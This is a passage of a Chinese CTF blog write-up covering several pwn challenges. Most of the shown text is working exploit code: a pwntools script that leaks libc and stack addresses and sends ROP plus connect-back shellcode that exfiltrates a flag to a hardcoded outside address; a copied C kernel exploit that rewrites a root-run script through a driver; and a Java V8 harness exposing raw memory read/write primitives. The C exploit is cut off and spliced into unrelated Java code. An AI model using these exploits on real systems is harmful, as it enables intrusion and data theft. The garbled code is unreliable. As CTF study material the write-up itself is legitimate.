+<p>memcpy。它直接将用户输入 <code>a2</code> 复制到地址 <code>a1</code> 中，长度完全由接收到的 recv_len 决定。如果 a1 是一个位于栈上的固定大小缓冲区，且程序没有限制我们的输入长度。</p>
+<p>程序有栈溢出。没有libc</p>
+<p> 因为这是一个网络服务程序，如果只用bin&#x2F;sh，Shell 可能会开在服务器本地，我们通过网络根本连不上。所以我们需要手写一段网络交互的 Shellcode  </p>
+<p>那应该就是那几个串起来，ORW，泄露libc。栈溢出泄露libc和栈地址</p>
+<p>我们最后的ORW还要放到栈上执行，所以需要用 mprotect  把权限开了。然后再执行我们的shellcode</p>
+<p><strong>利用 TCP泄露 Libevent 与 Libc 地址</strong></p>
+<p>当向 TCP 端口发送 <code>127.0.0.1\0</code> 并接收一段 0x50 长度的数据时，在偏移 0x48 处，残留着 <code>libevent</code> 库中的某个指针。</p>
+<ul>
+<li>利用公式计算基址：</li>
+</ul>
+<p>Base_libevent &#x3D; Addr_leak - 0x13b1a</p>
+<p>Base_libc &#x3D; Base_libevent - 0x249000</p>
+<p><strong>2. 泄露栈地址（利用 UDP）</strong></p>
+<p>同样的逻辑，我们向 UDP 端口发送短数据。在 UDP 处理流程的栈结构中，偏移 <code>0x40</code> 的位置残留着一个栈指针。</p>
+<ul>
+<li>计算出我们可控缓冲区的起始栈地址：</li>
+</ul>
+<p>Addr_stack &#x3D; Addr_leak - 0x3e0</p>
+<p>倒是每个地方不是很难，就是结合起来比较复杂</p>
+<pre><code class="language-python">from pwn import *
+
+
+ip = &#39;101.245.104.190&#39;
+t_port = 10003
+u_port = 10013
+
+# 为了拿 libevent 的地址，进而算 libc
+p = remote(ip, t_port)
+p.send(b&#39;127.0.0.1\0&#39;) 
+data = p.recv(0x50) 
+p.close()
+
+libevent_addr = u64(data[0x48:0x48+8])
+libevent_base = libevent_addr - 0x13b1a
+print(&quot;find_libevent_addr: &quot; + hex(libevent_base))
+
+
+libc_base = libevent_base - 0x249000
+print(&quot;calaulate_libc_addr: &quot; + hex(libc_base))
+
+#用 UDP 协议拿栈地址
+p2 = remote(ip, u_port, typ=&quot;udp&quot;)
+p2.send(b&#39;127.0.0.1\0&#39;)
+data2 = p2.recv(0x50)
+p2.close()
+
+stack_addr = u64(data2[0x40:0x40+8]) - 0x3e0
+print(&quot;找到栈地址了: &quot; + hex(stack_addr))
+
+# 第三次正式开始攻击
+p3 = remote(ip, t_port)
+
+# 准备 Shellcode，用来读 flag
+my_shellcode = asm(&#39;&#39;&#39;
+    xor esi, esi
+    mul rsi
+    inc esi
+    mov edi, esi
+    inc edi
+    mov al, 41
+    syscall
+    mov edi, eax
+    mov rbx, 0x9f0ca208c9ea0002
+    push rbx
+    mov rsi, rsp
+    mov dl, 16
+    mov al, 42
+    syscall
+    xor esi, esi
+    mov al, 33
+    syscall
+    inc esi
+    mov al, 33
+    syscall
+    inc esi
+    mov al, 33
+    syscall
+    mov eax, 0x67616c66
+    push rax
+    mov rdi, rsp
+    xor eax, eax
+    mov esi, eax
+    mov al, 2
+    syscall
+    push rax
+    mov rsi, rsp
+    xor eax, eax
+    mov edx, eax
+    inc eax
+    mov edi, eax
+    mov dl, 8
+    syscall
+    pop rax
+    test rax, rax
+    js over
+    mov edi, eax
+    mov rsi, rsp
+    mov edx, 1024
+    xor eax, eax
+    syscall
+    mov edx, eax
+    mov rsi, rsp
+    xor eax, eax
+    inc eax
+    mov edi, eax
+    syscall
+over:
+    xor edi, edi
+    mov eax, 60
+    syscall
+&#39;&#39;&#39;, arch=&#39;amd64&#39;)
+
+
+payload = b&#39;127.0.0.1\0&#39;
+payload += b&#39;A&#39; * 22  
+payload += p64(1)
+payload += p64(stack_addr - 0x110) 
+
+payload += p64(0) * 1 
+payload += p64(stack_addr) # 0x8
+payload += p64(stack_addr) # 0x10
+payload += b&#39;\0&#39; * (0x30 - 0x18)
+payload += p64(0) # 0x30
+payload += b&#39;\0&#39; * (0x68 - 0x38)
+payload += p64(stack_addr &amp; 0xfffffffffffff000) # 0x68
+payload += p64(0x1000) # 0x70
+payload += p64(stack_addr + 0x100) # 0x78
+payload += b&#39;\0&#39; * (0x88 - 0x80)
+payload += p64(7) # 0x88
+payload += b&#39;\0&#39; * (0xa0 - 0x90)
+payload += p64(stack_addr + 0x1d0) # 0xa0
+payload += p64(libc_base + 0x11eb20)
+payload += b&#39;\0&#39; * (0xe0 - 0xb0)
+payload += p64(stack_addr)
+payload += b&#39;\0&#39; * (0x100 - 0xe8)
+payload += p64(stack_addr + 0x100)
+payload += b&#39;\0&#39; * 8
+payload += p64(libc_base + 0x539e0) 
+payload += b&#39;\0&#39; * 8
+payload += p64(1)
+payload += b&#39;\0&#39; * (0x1d0 - 0x128)
+payload += p64(stack_addr + 0x1f0) 
+payload += b&#39;\0&#39; * (0x1f0 - 0x1d8)
+payload += my_shellcode 
+
+print(&quot;Payload_len: &quot; + str(len(payload)))
+p3.send(payload)
+
+p3.close()
+</code></pre>
+<h3 id="EzRouter"><a href="#EzRouter" class="headerlink" title="EzRouter"></a>EzRouter</h3><p>这直接加载出来一个路由器界面</p>
+<p>进入后台后可以下载固件。其中有一个 http 文件。</p>
+<p>这看不出来漏洞，不知道往哪个方向利用</p>
+<h3 id="Chronos-Ring1"><a href="#Chronos-Ring1" class="headerlink" title="Chronos_Ring1"></a>Chronos_Ring1</h3><h3 id="Chronos-Ring"><a href="#Chronos-Ring" class="headerlink" title="Chronos_Ring"></a>Chronos_Ring</h3><p>这两个是什么题，拿ai分析了说是</p>
+<p><strong>Chronos_Ring</strong> 是一道非常经典的 Linux 内核（Kernel）Pwn 题。它没有让你去构造复杂的 ROP 链或者堆溢出布局，而是侧重于对<strong>内核语义逻辑</strong>的理解。</p>
+<p>这道题的核心矛盾点在于：<strong>一个具备“修改文件 Page Cache”能力的内核驱动，撞上了一个“定期以 Root 权限执行”的脚本。</strong></p>
+<hr>
+<p><strong>这个应该是能知道它的问题在哪的，但是不会写具体的利用脚本</strong></p>
+<p><strong>（后面看了别人的复现，是拿c写的</strong></p>
+<p>** 主要是虽然你在文件系统中没有写的权限，但驱动提供的接口允许你从内核维度强行修改该文件在内存中的映射副本。  ）**</p>
+<p><strong>这里放一下别人的exp:</strong></p>
+<pre><code class="language-c">#include 
+
+#define AT_FDCWD -100
+
+#define O_RDONLY 0
+#define O_RDWR 2
+
+#define SYS_read 0
+#define SYS_write 1
+#define SYS_close 3
+#define SYS_ioctl 16
+#define SYS_nanosleep 35
+#define SYS_openat 257
+#define SYS_exit 60
+
+#define CHRONOS_CREATE 0x1001
+#define CHRONOS_AUTH 0x1002
+#define CHRONOS_PIN_USER 0x1003
+#define CHRONOS_ATTACH_FILE 0x1004
+#define CHRONOS_MAKE_VIEW 0x1005
+#define CHRONOS_COPY_TO_VIEW 0x1008
+
+struct timespec &#123;
+    int64_t tv_sec;
+    int64_t tv_nsec;
+&#125;;
+
+struct auth_req &#123;
+    uint64_t key;
+    uint32_t seed;
+    uint32_t pad;
+&#125;;
+
+struct write_req &#123;
+    uint64_t user_buf;
+    uint32_t len;
+    uint32_t off;
+&#125;;
+
+struct attach_req &#123;
+    int32_t fd;
+    uint32_t index;
+&#125;;
+
+struct copy_req &#123;
+    uint64_t pad;
+    uint32_t len;
+    uint32_t off;
+&#125;;
+
+static const uint64_t auth_const = 0xf372fe94f82b3c6eULL;
+static const uint64_t auth_base = 0x0ffffffff8100000ULL;
+static const uint64_t auth_step = 0x20000ULL;
+static const uint64_t auth_tries = 0x2000ULL;
+
+static const char dev_path[] = &quot;/dev/chronos_ring&quot;;
+static const char job_path[] = &quot;/tmp/job&quot;;
+static const char flag_path[] = &quot;/flag&quot;;
+
+static const char payload[] =
+    &quot;#!/bin/sh\n&quot;
+    &quot;chmod 644 /flag\n&quot;
+    &quot;#\n&quot;
+    &quot;################################&quot;;
+
+static char scratch[0x1000];
+
+static inline long syscall0(long nr) &#123;
+    long ret;
+
+    __asm__ volatile(
+        &quot;syscall&quot;
+        : &quot;=a&quot;(ret)
+        : &quot;a&quot;(nr)
+        : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);
+    return ret;
+&#125;
+
+static inline long syscall1(long nr, long a1) &#123;
+    long ret;
+
+    __asm__ volatile(
+        &quot;syscall&quot;
+        : &quot;=a&quot;(ret)
+        : &quot;a&quot;(nr), &quot;D&quot;(a1)
+        : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);
+    return ret;
+&#125;
+
+static inline long syscall2(long nr, long a1, long a2) &#123;
+    long ret;
+
+    __asm__ volatile(
+        &quot;syscall&quot;
+        : &quot;=a&quot;(ret)
+        : &quot;a&quot;(nr), &quot;D&quot;(a1), &quot;S&quot;(a2)
+        : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);
+    return ret;
+&#125;
+
+static inline long syscall3(long nr, long a1, long a2, long a3) &#123;
+    long ret;
+
+    __asm__ volatile(
+        &quot;syscall&quot;
+        : &quot;=a&quot;(ret)
+        : &quot;a&quot;(nr), &quot;D&quot;(a1), &quot;S&quot;(a2), &quot;d&quot;(a3)
+        : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);
+    return ret;
+&#125;
+
+static inline long syscall4(long nr, long a1, long a2, long a3, long a4) &#123;
+    long ret;
+    register long r10 __asm__(&quot;r10&quot;) = a4;
+
+    __asm__ volatile(
+        &quot;syscall&quot;
+        : &quot;=a&quot;(ret)
+        : &quot;a&quot;(nr), &quot;D&quot;(a1), &quot;S&quot;(a2), &quot;d&quot;(a3), &quot;r&quot;(r10)
+        : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);
+    return ret;
+&#125;
+
+static inline long openat(int dirfd, const char *path, int flags, int mode) &#123;
+    return syscall4(SYS_openat, dirfd, (long)path, flags, mode);
+&#125;
+
+static inline long close_fd(int fd) &#123;
+    return syscall1(SYS_close, fd);
+&#125;
+
+static inline long do_ioctl(int fd, unsigned long cmd, void *arg) &#123;
+    return syscall3(SYS_ioctl, fd, cmd, (long)arg);
+&#125;
+
+static inline long read_fd(int fd, void *buf, unsigned long len) &#123;
+    return syscall3(SYS_read, fd, (long)buf, len);
+&#125;
+
+static inline long write_fd(int fd, const void *buf, unsigned long len) &#123;
+    return syscall3(SYS_write, fd, (long)buf, len);
+&#125;
+
+static inline void sleep_secs(long secs) &#123;
+    struct timespec ts;
+
+    ts.tv_sec = secs;
+    ts.tv_nsec = 0;
+    syscall2(SYS_nanosleep, (long)&amp;ts, 0);
+&#125;
+
+static inline void exit_now(int code) &#123;
+    syscall1(SYS_exit, code);
+    __builtin_unreachable();
+&#125;
+
+static unsigned long str_len(const char *s) &#123;
+    unsigned long n = 0;
+
+    while (s[n]) &#123;
+        ++n;
+    &#125;
+    return n;
+&#125;
+
+static void write_str(int fd, const char *s) &#123;
+    write_fd(fd, s, str_len(s));
+&#125;
+
+static void write_flag(void) &#123;
+    char buf[128];
+    long fd;
+    long n;
+    int tries;
+
+    for (tries = 0; tries = 0) &#123;
+            n = read_fd((int)fd, buf, sizeof(buf));
+            if (n &gt; 0) &#123;
+                write_fd(1, buf, (unsigned long)n);
+                write_fd(1, &quot;\n&quot;, 1);
+                close_fd((int)fd);
+                exit_now(0);
+            &#125;
+            close_fd((int)fd);
+        &#125;
+        sleep_secs(1);
+    &#125;
+
+    write_str(2, &quot;failed to read /flag\n&quot;);
+    exit_now(1);
+&#125;
+
+static void auth_ring(int fd) &#123;
+    uint64_t i;
+
+    for (i = 0; i  MAX_SCRIPT_SIZE) &#123;
+        System.out.println(&quot;Error: script too large (max 1MB)&quot;);
+        return;
+    &#125;
+
+    // 把当前行追加到脚本内容里，并补一个换行
+    script.append(line).append(&quot;\n&quot;);
+&#125;
+
+// 创建一个 V8 JavaScript 运行时环境
+V8 v8 = V8.createV8Runtime();
+
+// 向 JS 环境注册一个名为 log 的 Java 方法
+// 这样 JS 代码里就可以调用 log(...)，实际会执行这里的 Java 回调
+v8.registerJavaMethod((JavaVoidCallback) (receiver, params) -&gt; &#123;
+    // 如果传入了参数，就打印第一个参数
+    if (params.length() &gt; 0) &#123;
+        System.out.println(params.get(0).toString());
+        System.out.flush();
+    &#125;
+&#125;, &quot;log&quot;);
+
+// 执行前面拼接好的 JS 脚本，并拿到执行结果
+Object result = v8.executeScript(script.toString());
+构建调试版 App
+
+我们可以看到上述这个 app 功能很简略，我们可以重新改一下这个 app，使其具有调试的功能。
+
+修改之后的完整的源码如下（需要同时修改 Dockerfile 和 sh 文件）：
+
+import com.eclipsesource.v8.*;
+import sun.misc.Unsafe;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.lang.reflect.Field;
+import java.util.Locale;
+
+public class DebugApp &#123;
+    private static final int MAX_SCRIPT_SIZE = 1048576;
+    private static final Unsafe UNSAFE = getUnsafe();
+
+    public static void main(String[] args) throws Exception &#123;
+        System.out.println(&quot;  ____  _   _ ____            &quot;);
+        System.out.println(&quot; / || | | | __ )  _____  &quot;);
+        System.out.println(&quot; \\ \\| | | |  _ \\ / _ \\ \\/ /&quot;);
+        System.out.println(&quot;  ) | || | |) | () &gt;   MAX_SCRIPT_SIZE) &#123;
+                System.out.println(&quot;Error: script too large (max 1MB)&quot;);
+                return;
+            &#125;
+            script.append(line).append(&quot;\n&quot;);
+        &#125;
+
+        if (script.isEmpty()) &#123;
+            System.out.println(&quot;Error: empty script&quot;);
+            return;
+        &#125;
+
+        System.out.println(&quot;[*] Executing...&quot;);
+        System.out.flush();
+
+        V8 v8 = V8.createV8Runtime();
+
+        v8.registerJavaMethod((JavaVoidCallback) (receiver, params) -&gt; &#123;
+            if (params.length() &gt; 0) &#123;
+                System.out.println(params.get(0).toString());
+                System.out.flush();
+            &#125;
+        &#125;, &quot;log&quot;);
+
+        v8.registerJavaMethod((JavaCallback) (receiver, params) -&gt; &#123;
+            Object obj = params.get(0);
+            return hex(nativeHandleOf(obj));
+        &#125;, &quot;addr&quot;);
+
+        v8.registerJavaMethod((JavaCallback) (receiver, params) -&gt; &#123;
+            long addr = parseAddr(params.get(0).toString());
+            return hex(UNSAFE.getLong(addr));
+        &#125;, &quot;read64&quot;);
+
+        v8.registerJavaMethod((JavaCallback) (receiver, params) -&gt; &#123;
+            long addr = parseAddr(params.get(0).toString());
+            long value = Integer.toUnsignedLong(UNSAFE.getInt(addr));
+            return hex(value);
+        &#125;, &quot;read32&quot;);
+
+        v8.registerJavaMethod((JavaCallback) (receiver, params) -&gt; &#123;
+            long addr = parseAddr(params.get(0).toString());
+            int size = params.length() &gt; 1 ? parseSize(params.get(1).toString()) : 0x80;
+            return dump(addr, size);
+        &#125;, &quot;dump&quot;);
+
+        v8.registerJavaMethod((JavaVoidCallback) (receiver, params) -&gt; &#123;
+            long addr = parseAddr(params.get(0).toString());
+            long value = parseAddr(params.get(1).toString());
+            UNSAFE.putLong(addr, value);
+        &#125;, &quot;write64&quot;);
+
+        v8.registerJavaMethod((JavaVoidCallback) (receiver, params) -&gt; &#123;
+            System.gc();
+            System.runFinalization();
+        &#125;, &quot;jgc&quot;);
+
+        try &#123;
+            Object result = v8.executeScript(script.toString());
+            if (result instanceof V8Object) &#123;
+                ((V8Object) result).release();
+            &#125;
+        &#125; catch (Throwable t) &#123;
+            System.out.println(&quot;Error: &quot; + t);
+            t.printStackTrace(System.out);
+        &#125; finally &#123;
+            if (!v8.isReleased()) &#123;
+                v8.release();
+            &#125;
+        &#125;
+    &#125;
+
+    private static Unsafe getUnsafe() &#123;
+        try &#123;
+            Field f = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
+            f.setAccessible(true);
+            return (Unsafe) f.get(null);
+        &#125; catch (Exception e) &#123;
+            throw new RuntimeException(&quot;failed to get Unsafe&quot;, e);
+        &#125;
+    &#125;
+
+    private static long nativeHandleOf(Object obj) &#123;
+        if (!(obj instanceof V8Value)) &#123;
+            throw new IllegalArgumentException(&quot;addr() expects a V8 object/value&quot;);
+        &#125;
+        try &#123;
+            Field f = V8Value.class.getDeclaredField(&quot;objectHandle&quot;);
+            f.setAccessible(true);
+            return f.getLong(obj);
+        &#125; catch (Exception e) &#123;
+            throw new RuntimeException(&quot;failed to read V8Value.objectHandle&quot;, e);
+        &#125;
+    &#125;
+
+    private static long parseAddr(String text) &#123;
+        String s = text.trim().toLowerCase(Locale.ROOT);
+        if (s.startsWith(&quot;0x&quot;)) &#123;
+            s = s.substring(2);
+        &#125;
+        if (s.isEmpty()) &#123;
+            return 0L;
+        &#125;
+        return Long.parseUnsignedLong(s, 16);
+    &#125;
+
+    private static int parseSize(String text) &#123;
+        String s = text.trim().toLowerCase(Locale.ROOT);
+        if (s.startsWith(&quot;0x&quot;)) &#123;
+            return Integer.parseUnsignedInt(s.substring(2), 16);
+        &#125;
+        return Integer.parseInt(s);
+    &#125;
+
+    private static String hex(long value) &#123;
+        return &quot;0x&quot; + Long.toUnsignedString(value, 16);
+    &#125;
+
+    private static String dump(long addr, int size) &#123;
+        StringBuilder sb = new StringBuilder();
+        for (int off = 0; off &lt; size; off += 16) &#123;
+            sb.append(hex(addr + off)).append(&quot;: &quot;);
+            for (int i = 0; i &lt; 16 &amp;&amp; off + i &lt; size; i++) &#123;
+                int b = UNSAFE.getByte(addr + off + i) &amp; 0xff;
+                if (i != 0) &#123;
+                    sb.append(&#39; &#39;);
+                &#125;
+                if (b &lt; 0x10) &#123;
+                    sb.append(&#39;0&#39;);
+                &#125;
+                sb.append(Integer.toHexString(b));
+            &#125;
+            if (off + 16 &lt; size) &#123;
+                sb.append(&#39;\n&#39;);
+            &#125;
+        &#125;
+        return sb.toString();
+    &#125;
+&#125;
+</code></pre>
+<h3 id="BOX"><a href="#BOX" class="headerlink" title="BOX"></a>BOX</h3><p>怎么还有java</p>
+<h2 id="minivfs"><a href="#minivfs" class="headerlink" title="minivfs"></a>minivfs</h2><p>这个是堆题，可以稍微能做了</p>
+<p>先分析一下题目，这道题的glibc版本是 2.41</p>
+<p>高版本libc下面，我们就不能简单的泄露然后利用几个hook就能达到利用的目的。这道题还是有点难</p>
+<p>首先我们拿ai分析有这么一个东西</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/58878864/1775054938192-7f3e8512-3812-476e-b872-78010b8b004f.png"></p>
+<p>不过绕过这个之后，堆的部分利用思路还是首先需要泄露libc</p>
+<p>有个沙箱那是要在栈上写ORW？</p>
+<p>ai给的建议：</p>
+<p> 由于 Glibc 2.41 没有 Hook，且存在 Seccomp 限制，直接 <code>system</code> 是死路一条。最稳妥的办法是劫持 <code>_IO_list_all</code> 执行 <strong>FSOP (File Stream Oriented Programming)</strong></p>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 良夜の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;良夜
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="ice993/hexo-123"
+    data-repo-id="R_kgDOPWL0Lg"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOPWL0Ls4Ct1k-"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+    <script>
+    if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/sw.js");
+    }
+    </script>
+</body>
+</html>
